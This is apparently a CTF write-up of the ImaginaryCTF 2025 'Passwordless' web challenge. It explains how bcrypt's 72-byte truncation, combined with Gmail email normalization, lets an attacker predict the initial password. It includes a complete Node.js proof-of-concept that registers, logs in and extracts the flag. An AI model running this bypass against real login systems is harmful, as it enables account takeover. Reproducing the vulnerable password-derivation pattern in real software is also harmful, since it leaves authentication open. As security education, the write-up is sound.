# ImaginaryCTF 2025: Passwordless Write-up

This write-up explains how to solve the "Passwordless" web challenge. The goal is to authenticate and retrieve the flag displayed on the dashboard without receiving the emailed temporary password.

## 1. Initial Analysis

The app is a simple Express + EJS site with in-memory SQLite storage. Key libraries:
- `normalize-email` to canonicalize user emails
- `bcrypt` to hash passwords

Relevant flows in `challenge/index.js`:
- Registration (`POST /user`): stores the user under `normalizeEmail(req.body.email)` and hashes a generated initial password built from the raw email.
- Login (`POST /session`): looks up the user by `normalizeEmail(email)` and verifies `bcrypt.compare(password, storedHash)`.

## 2. Identifying the Vulnerability

At registration, the app builds an initial password by concatenating the raw email with random bytes, then hashes it with bcrypt:

```javascript
const nEmail = normalizeEmail(req.body.email)
// ... length check applies to normalized email only
const initialPassword = req.body.email + crypto.randomBytes(16).toString('hex')
bcrypt.hash(initialPassword, 10, function (err, hash) {
  db.run("INSERT INTO users VALUES (?, ?)", [nEmail, hash], ...)
})
```

On login, it normalizes the submitted email and compares with bcrypt:

```javascript
const email = normalizeEmail(req.body.email)
const password = req.body.password
authenticate(email, password, (err, user) => {
  if (user && bcrypt.compareSync(password, user.password)) { /* success */ }
})
```

Key insight: bcrypt truncates input to the first 72 bytes. If the raw email is already ≥ 72 bytes, then the random suffix added at registration has no effect. Meanwhile, Gmail-style normalization (handled by `normalize-email`) removes dots and `+tags` from the local-part, so the stored `nEmail` can be short (passes the 64-char check) while the raw email is very long.

Therefore, we can:
- Register with a very long raw Gmail address (local-part ≥ 72 bytes pre-normalization), ensuring the bcrypt hash effectively depends only on the first 72 bytes of the local-part we chose.
- Log in using the normalized email and as password exactly those first 72 bytes.

## 3. Exploitation

How:
1. Choose Gmail domain so normalization applies.
2. Craft raw email: `A...A + "+" + B...B + "@gmail.com"` where `A...A` makes the normalized email length ≤ 64, and `A...A + "+" + B...B` has length ≥ 72.
3. Register with that raw email (any temporary password is “emailed” but unused).
4. Log in with:
   - Email: normalized form (dots removed, `+tag` dropped): `A...A@gmail.com`
   - Password: the first 72 bytes of `A...A + "+" + B...B` (exactly as sent at registration, before `@`).
5. Visit `/dashboard` to view the flag.


PoC:


```javascript
// One-shot PoC for the "passwordless" challenge
// Exploit bcrypt 72-byte truncation combined with email normalization.
// Usage: node exploit-poc.js http://passwordless.chal.imaginaryctf.org

const BASE = process.argv[2] || 'http://localhost:3000';

function buildEmails() {
  // Normalized gmail keeps local-part without dots and drops "+..."
  const normalizedLocal = 'a'.repeat(54); // 54 + '@gmail.com' (10) = 64
  const plusTag = 'b'.repeat(100); // large plus-tag to push raw length >= 72
  const rawLocal = normalizedLocal + '+' + plusTag; // raw >= 72
  const domain = '@gmail.com';
  const rawEmail = rawLocal + domain;
  const normEmail = normalizedLocal + domain; // what normalize-email likely stores
  // Bcrypt truncates to 72 bytes; password becomes first 72 bytes of rawEmail (i.e., of rawLocal)
  const password = rawLocal.slice(0, 72);
  return { rawEmail, normEmail, password };
}

function parseSetCookie(headers) {
  const set = headers.get('set-cookie');
  if (!set) return {};
  const jar = {};
  const cookies = Array.isArray(set) ? set : [set];
  for (const line of cookies) {
    const pair = line.split(';', 1)[0];
    const idx = pair.indexOf('=');
    if (idx > 0) {
      const name = pair.slice(0, idx).trim();
      const value = pair.slice(idx + 1).trim();
      jar[name] = value;
    }
  }
  return jar;
}

function jarToHeader(jar) {
  return Object.entries(jar)
    .map(([k, v]) => `${k}=${v}`)
    .join('; ');
}

async function fetchWithJar(url, opts, jar) {
  const headers = Object.assign({}, opts?.headers);
  if (jar && Object.keys(jar).length) headers['Cookie'] = jarToHeader(jar);
  const res = await fetch(url, { ...opts, headers, redirect: 'manual' });
  const newCookies = parseSetCookie(res.headers);
  Object.assign(jar, newCookies);
  return res;
}

async function main() {
  if (typeof fetch !== 'function') {
    console.error('This PoC requires Node 18+ with global fetch.');
    process.exit(1);
  }

  const { rawEmail, normEmail, password } = buildEmails();
  const jar = {};

  console.log('[+] Crafted emails:');
  console.log(`    Raw:  ${rawEmail}`);
  console.log(`    Norm: ${normEmail}`);
  console.log(`    Pwd:  ${password}`);

  // 1) Register account with very long raw email
  console.log(`[+] Registering ${normEmail} (raw length ${rawEmail.length})`);
  let res = await fetchWithJar(`${BASE}/user`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: `email=${encodeURIComponent(rawEmail)}`,
  }, jar);
  console.log(`[+] Register response: ${res.status}`);

  // 2) Login using normalized email and truncated password (first 72 bytes of raw email)
  await new Promise((r) => setTimeout(r, 300));
  console.log('[+] Logging in with known truncated password');
  res = await fetchWithJar(`${BASE}/session`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: `email=${encodeURIComponent(normEmail)}&password=${encodeURIComponent(password)}`,
  }, jar);
  console.log(`[+] Login response: ${res.status}`);

  // 3) Fetch dashboard with session cookie
  await new Promise((r) => setTimeout(r, 300));
  console.log('[+] Fetching dashboard');
  res = await fetchWithJar(`${BASE}/dashboard`, { method: 'GET' }, jar);
  const html = await res.text();
  console.log(`[+] Dashboard: ${res.status}`);

  const m = html.match(/<span id="flag">([\s\S]*?)<\/span>/);
  if (m) {
    const flag = m[1].trim();
    console.log(`[+] Flag: ${flag}`);
  } else {
    console.log('[!] Flag span not found. Full body follows:\n');
    console.log(html);
  }
}

main().catch((e) => {
  console.error('[!] PoC error:', e);
  process.exit(1);
});
```

Why it works:
- Bcrypt ignores everything after 72 bytes, so the random suffix appended at registration is ineffective when the raw email is long enough.
- The app stores and looks up users by normalized email, but derives the initial password from the raw email, creating a mismatch exploitable via Gmail normalization.

## 4. The Flag

On successful login, the dashboard renders the flag inside:

```ejs
<span id="flag"><%- process.env.FLAG %></span>
```

